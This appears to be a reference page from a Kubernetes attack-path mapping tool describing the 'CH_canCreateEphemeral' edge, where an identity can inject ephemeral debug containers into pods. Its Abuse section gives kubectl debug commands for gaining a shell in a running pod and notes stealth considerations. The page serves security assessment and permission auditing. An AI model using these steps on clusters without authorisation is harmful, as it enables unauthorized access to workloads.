# CH_canCreateEphemeral

## Edge Schema

- **Source:** [CH_Identity](../NodeDescriptions/CH_Identity.md)
- **Target:** [CH_Pod](../NodeDescriptions/CH_Pod.md) / [CH_Namespace](../NodeDescriptions/CH_Namespace.md) / [CH_Cluster](../NodeDescriptions/CH_Cluster.md)

## General Information

The Identity holds `pods/ephemeralcontainers` permission, allowing injection of ephemeral debug containers into running Pods. Points to specific Pod(s) if `resourceNames` is set, otherwise to the Namespace or Cluster.

## Abuse

Inject an ephemeral container into a running pod to gain shell access without modifying the pod spec or triggering a restart. Particularly useful against distroless or scratch-based containers that lack a shell and therefore cannot be targeted with `CH_canExec`. Ephemeral containers cannot be removed once added and will appear in the pod's spec, so bear this in mind for stealth.

```bash
# Inject an ephemeral container and get a shell
kubectl debug -it <pod> -n <namespace> \
  --image=busybox \
  --target=<container>

# Share the target container's process namespace
kubectl debug -it <pod> -n <namespace> \
  --image=ubuntu \
  --target=<container> \
  -- bash
```

## References

- [Kubernetes Ephemeral Containers](https://kubernetes.io/docs/concepts/workloads/pods/ephemeral-containers/)
- [kubectl debug](https://kubernetes.io/docs/reference/kubectl/generated/kubectl_debug/)
- [OWASP K02 - Overly Permissive Authorization Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K02-Overly-Permissive-Authorization-Configurations.html)
- [Threat Matrix - Sidecar Injection](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Sidecar%20Injection/)
